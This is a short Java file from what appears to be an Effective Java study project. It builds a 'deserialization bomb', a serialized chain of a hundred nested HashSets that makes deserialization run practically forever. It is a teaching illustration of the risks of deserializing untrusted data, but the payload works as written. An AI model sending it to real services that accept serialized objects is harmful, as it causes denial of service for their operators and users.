//: com.yulikexuan.effectivejava.serialization.DeserializationBomb.java

package com.yulikexuan.effectivejava.serialization;


import java.util.HashSet;
import java.util.Set;

import static com.yulikexuan.effectivejava.serialization.Util.*;


public class DeserializationBomb {

    public static void main(String[] args) throws Exception {
        System.out.println(bomb().length);
        deserialize(bomb());
    }

    /*
     * root ---> Set
     * s1   __/
     *
     * s2   ---> Set
     *
     * t1   ---> Set
     *
     * t2   ---> Set
     *
     */
    static byte[] bomb() {

        Set<Object> root = new HashSet<>();
        Set<Object> s1 = root;
        Set<Object> s2 = new HashSet<>();

        for (int i = 0; i < 100; i++) {
            Set<Object> t1 = new HashSet<>();
            Set<Object> t2 = new HashSet<>();
            t1.add("foo"); // make it not equal to t2
            s1.add(t1);
            s1.add(t2);
            s2.add(t1);
            s2.add(t2);
            s1 = t1;
            s2 = t2;
        }

        return serialize(root);
    }

}///:~